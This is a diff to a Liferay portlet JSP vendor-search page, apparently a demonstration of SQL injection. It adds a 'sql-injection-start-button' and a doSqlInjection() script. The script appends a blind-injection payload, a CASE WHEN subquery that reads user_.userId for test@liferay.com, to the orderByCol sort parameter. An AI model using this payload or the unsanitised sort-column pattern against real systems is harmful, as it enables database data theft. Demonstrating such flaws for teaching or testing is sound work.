@@ -1,4 +1,3 @@
-<%@page import="com.liferay.portal.kernel.util.ParamUtil"%>
 <%@ include file="./init.jsp" %>
 
 <%
@@ -12,8 +11,8 @@ if (vendors == null) {
 
 String keyword = GetterUtil.get(renderRequest.getAttribute("keyword"), "");
 
-String orderByCol = ParamUtil.getString(renderRequest, "orderByCol", "name");
-String orderByType = ParamUtil.getString(renderRequest, "orderByType", "asc");
+String orderByCol = ParamUtil.getString(renderRequest, SearchContainer.DEFAULT_ORDER_BY_COL_PARAM, "name");
+String orderByType = ParamUtil.getString(renderRequest, SearchContainer.DEFAULT_ORDER_BY_TYPE_PARAM, "asc");
 
 %>
 
@@ -36,31 +35,6 @@ String orderByType = ParamUtil.getString(renderRequest, "orderByType", "asc");
 	name="fmremall">
 </aui:form>
 
-<%--
-<aui:row>
-	<aui:col md="2">
-		<aui:input name="name" label="name" value="" placeholder="3DLabs" />
-	</aui:col>
-	<aui:col md="2">
-		<aui:input name="hwid" label="hw-id" value="" placeholder="3D3D" />
-	</aui:col>
-	<aui:col md="3">
-		<aui:input name="description" label="description" value="" placeholder="3DLabs" />
-	</aui:col>
-	<aui:col md="3">
-		<aui:input name="website" label="website" value="" placeholder="www.3dlabs.com" />
-	</aui:col>
-	<aui:col md="2">
-		<aui:input name="metdata" label="metadata" value="" placeholder="metadatas" />
-	</aui:col>
-</aui:row>
---%>
-
-<aui:button-row>
-	<aui:a href="#" cssClass="btn btn-primary" label="add-samples" onClick="doSubmit('fmaddsamples')"/>
-	<aui:a href="#" cssClass="btn btn-danger" label="remove-all" onClick="doSubmit('fmremall')"/>
-</aui:button-row>
-
 <aui:form
 	action="<%= searchFormActionURL.toString() %>"
 	method="post"
@@ -69,14 +43,15 @@ String orderByType = ParamUtil.getString(renderRequest, "orderByType", "asc");
 	<aui:field-wrapper cssClass="container-fluid-1280 lfr-search-container-wrapper">
 		<aui:row>
 			<aui:col md="4">
-				<aui:input name="keyword" label="keyword" value="<%= keyword %>" />
+				<aui:input name="keyword" label="" value="<%= keyword %>" placeholder="insert search keyword here..." />
+			</aui:col>
+			<aui:col md="8">
+				<aui:button type="submit" name="search" value="search" />
+				<aui:a href="#" cssClass="btn btn-primary btn-default" label="add-samples" onClick="doSubmit('fmaddsamples')"/>
+				<aui:a href="#" cssClass="btn btn-danger btn-default" label="remove-all" onClick="doSubmit('fmremall')"/>
+				<aui:a href="#" id="sqlinjbutton" cssClass="btn btn-danger btn-default" label="sql-injection-start-button" onClick="doSqlInjection()"/>
 			</aui:col>
 		</aui:row>
-		
-		<aui:button-row>
-			<aui:button type="submit" name="search" value="search" />
-			<aui:button type="reset" name="reset" value="clear" />
-		</aui:button-row>
 	</aui:field-wrapper>
 	<liferay-ui:search-container
 		cssClass="container-fluid-1280" 
@@ -168,9 +143,49 @@ String orderByType = ParamUtil.getString(renderRequest, "orderByType", "asc");
 </aui:form>
 <aui:script>
 	function doSubmit(formName) {
+		event.preventDefault();
 		var fm = $("#<portlet:namespace/>" + formName);
 		if (fm) {
 			submitForm(fm);
+		}
+	}
+	function getCurrentState() {
+		var container = $("#<portlet:namespace/>vendorsSearchContainer");
+		var arr = container.find(".searchcontainer-content .table-data .table-cell.text-nowrap.first");
+		var curIds = [];
+		arr.each(function(i) {
+			curIds.push($($(arr[i])[0]).text().trim());
+		});
+		return curIds;
+	}
+	function doSqlInjection() {
+		event.preventDefault();
+
+		var prevState = window.localStorage.getItem("curState");
+		if (!prevState) {
+			console.log("- Initializing localStorage...");
+			prevState = getCurrentState();
+			window.localStorage.setItem("curState", prevState);
+		}
+		else {
+			console.log("- localStorage loaded");
+		}
+		
+		var namespace = "<portlet:namespace/>";
+		var sqlinjbutton = AUI().one("#<portlet:namespace/>sqlinjbutton");
+		var searchUrl = "<%= searchFormActionURL.toString() %>";
+		var sqlinj_default = "(CASE WHEN  (SELECT substring(CONVERT(userId, CHAR),1,1) FROM user_ WHERE emailAddress like 'test@liferay.com') = '2' THEN name ELSE vendorId END)";
+		var sqlinj =  prompt("Please enter sql injection", sqlinj_default);
+		if (sqlinj == null ||sqlinj == undefined || sqlinj.length == 0) {
+			sqlinj = sqlinj_default;
+		}
+		else {
+			searchUrl += "&" + namespace + "<%= SearchContainer.DEFAULT_ORDER_BY_COL_PARAM %>" + "=" + sqlinj;
+			searchUrl += "&" + namespace + "<%= SearchContainer.DEFAULT_ORDER_BY_TYPE_PARAM %>" + "=" + "asc"; 
+		
+			console.log("injection url is: ");
+			console.log(searchUrl);
+			alert("Please open your JavaScript console to see the injection url!");
 		}
 	}
 </aui:script>
